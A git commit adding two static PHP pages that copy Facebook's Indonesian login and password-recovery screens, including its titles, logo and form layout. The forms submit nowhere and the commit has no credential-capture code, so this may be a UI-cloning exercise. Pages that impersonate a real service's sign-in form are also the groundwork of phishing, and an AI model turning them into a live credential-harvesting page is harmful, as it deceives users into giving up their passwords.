0f802b4ac04ac29f03bdad8b4f154d8f444aa4e5
yayanfr20 <yayanfathurohman20@gmail.com>
2023-04-01 21:35:56 +0700

    push

---
+++ forget-password.php
@@ -0,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+     <meta charset="UTF-8">
+     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Facebook - Lupa kata sandi?</title>
+     <link rel="shortcut icon" href="images/favicon.webp" type="images">
+     <link rel="stylesheet" href="css/forget-password.css">
+</head>
+
+<body>
+     <div class="container">
+          <form action="" class="form-forget-password">
+               <div class="header">
+                    <h2>Temukan Akun Anda</h2>
+               </div>
+               <p>Masukkan email atau nomor ponsel Anda untuk mencari akun Anda.</p>
+               <div class="mb-3">
+                    <input type="text" class="form-input" placeholder="Email atau nomor ponsel">
+               </div>
+               <div class="footer">
+                    <a href="index" class="btn-back">Batalkan</a>
+                    <button class="btn-search">Cari</button>
+               </div>
+          </form>
+     </div>
+</body>
+
+</html>
---
+++ index.php
@@ -0,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+     <meta charset="UTF-8">
+     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Facebook - Masuk atau Daftar</title>
+     <link rel="shortcut icon" href="images/favicon.webp" type="images">
+     <link rel="stylesheet" href="css/login.css">
+</head>
+
+<body>
+     <div class="container">
+          <form action="" class="form-login">
+               <div class="brand">
+                    <img src="images/logo.svg" alt="">
+               </div>
+               <div class="mb-3">
+                    <input type="text" class="form-input" placeholder="Email atau Nomor Telepon">
+               </div>
+               <div class="mb-3">
+                    <input type="password" class="form-input" placeholder="Kata sandi">
+               </div>
+               <div class="mb-3">
+                    <button class="btn-login">Masuk</button>
+               </div>
+               <a href="forget-password" class="text-blue">Lupa kata sandi?</a>
+               <hr>
+               <div class="regis">
+                    <a href="registrasi" class="btn-regis">Buat akun baru</a>
+               </div>
+          </form>
+     </div>
+</body>
+
+</html>
